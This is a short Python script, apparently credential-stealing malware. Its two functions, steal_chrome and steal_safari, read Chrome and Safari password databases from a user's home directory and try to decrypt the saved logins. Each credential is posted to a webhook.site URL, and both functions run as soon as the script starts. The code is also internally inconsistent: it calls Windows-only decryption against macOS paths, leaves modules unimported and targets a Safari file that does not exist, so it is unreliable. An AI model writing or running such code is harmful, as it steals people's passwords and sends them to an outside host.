import os
import sqlite3
import requests

def steal_chrome():
    username = os.getlogin()
    db_path = f"/Users/{username}/Library/Application Support/Google/Chrome/Default/Login Data"
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, username, encrypted_password in cursor.fetchall():
        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        requests.post("https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189", data=f"Chrome Password: {decrypted_password} for {username} on {url}")
    cursor.close()
    conn.close()

def steal_safari():
    username = os.getlogin()
    db_path = f"/Users/{username}/Library/Safari/Passwords.db"
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT user, password, host FROM passwords")
    for username, encrypted_password, url in cursor.fetchall():
        decrypted_password = Security.SecKeychainFindInternetPassword(None, len(url), url, 0, None, len(username), username, 0, None, Security.kSecProtocolTypeAny, Security.kSecAuthenticationTypeAny, None, None, None)[2].decode()
        requests.post("https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189", data=f"Safari Password: {decrypted_password} for {username} on {url}")
    cursor.close()
    conn.close()

steal_chrome()
steal_safari()
